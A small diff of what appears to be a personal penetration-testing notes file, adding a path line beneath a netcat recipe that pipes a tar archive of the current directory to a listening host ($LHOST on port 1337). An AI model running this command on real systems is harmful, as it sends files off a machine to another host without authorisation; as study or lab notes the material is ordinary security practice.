@@ -7,6 +7,8 @@ nc -lvnp 1337 | tar -xf -
 tar -cf - . | nc $LHOST 1337
 ```
 
+` zet/20221003150902/README.md `
+
 # Related
 
 - [20221003150920](/zet/20221003150920/README.md) linux enumeration quick commands
